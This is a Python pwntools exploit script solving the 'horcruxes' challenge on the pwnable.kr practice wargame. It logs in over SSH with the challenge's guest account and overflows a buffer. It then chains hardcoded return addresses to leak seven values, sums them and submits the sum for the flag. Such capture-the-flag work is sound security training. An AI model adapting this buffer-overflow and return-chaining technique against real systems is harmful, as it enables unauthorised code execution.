#!/usr/bin/env python3
# -*- coding: utf-8 -*-
from pwn import *

exe = context.binary = ELF('horcruxes')

host = args.HOST or 'pwnable.kr'
port = int(args.PORT or 2222)
user = args.USER or 'horcruxes'
password = args.PASSWORD or 'guest'
remote_path = './horcruxes'

# Connect to the remote SSH server
shell = None
if not args.LOCAL:
    shell = ssh(user, host, port, password)
    shell = shell.remote('0', 9032)  # manually written by me
    #shell.set_working_directory(symlink=True)

def start_local(argv=[], *a, **kw):
    '''Execute the target binary locally'''
    if args.GDB:
        return gdb.debug([exe.path] + argv, gdbscript=gdbscript, *a, **kw)
    else:
        return process([exe.path] + argv, *a, **kw)

def start_remote(argv=[], *a, **kw):
    '''Execute the target binary on the remote host'''
    if args.GDB:
        return gdb.debug([remote_path] + argv, gdbscript=gdbscript, ssh=shell, *a, **kw)
    else:
        return shell

def start(argv=[], *a, **kw):
    '''Start the exploit against the target.'''
    if args.LOCAL:
        return start_local(argv, *a, **kw)
    else:
        return start_remote(argv, *a, **kw)

def parse_abcdefg(inp):
    results = []
    EXP_splited = inp.split("EXP +")
    for i in range(1, len(EXP_splited)):
        results.append(int(EXP_splited[i].split(")")[0]))
    
    print(f"\n\t*** The 7 horcruxes are: {results}")
    return results    
    

gdbscript = '''
break *init_ABCDEFG
break *ropme+224
continue
'''.format(**locals())


# --- Actual Exploit Starts Here ---
'''
the idea:
1. First call all horcruxes (call function a() then b() then c() and so on...)
2. The functions will print all the important values we need (variable a, variable b, variable c, and so on), so save them.
3. Then calculate the sum (a + b + c + d + e + f + g)
4. After that call the ropme() function (again) with the following inputs: first input = 1; second input = [sum var that we calculated in step 3].  NOTE - the first input which is 1, isn't important, it is junk, so you can change it to whatever.
5. Finally enjoy the function printing the flag :)
'''

offset = b"A"*120
A = p32(0x0809fe4b)
B = p32(0x0809fe6a)
C = p32(0x0809fe89)
D = p32(0x0809fea8)
E = p32(0x0809fec7)
F = p32(0x0809fee6)
G = p32(0x0809ff05)
call_ropme = p32(0x0809fffc)

io = start()
io.recv() # recv menu text

# getting all the horcruxes
io.sendline(b"1")
io.recvuntil(b": ")
io.sendline(offset + A + B + C + D + E + F + G + call_ropme)

results = parse_abcdefg(io.recvuntil(b'Select').decode("utf-8"))

# calculating the sum
horcruxes_sum = sum(results)
print(f"\t*** the sum is: {horcruxes_sum}")

# sending the sum
io.sendline(b"1")
io.recvuntil(b": ")
io.sendline(str(horcruxes_sum).encode())

io.interactive()
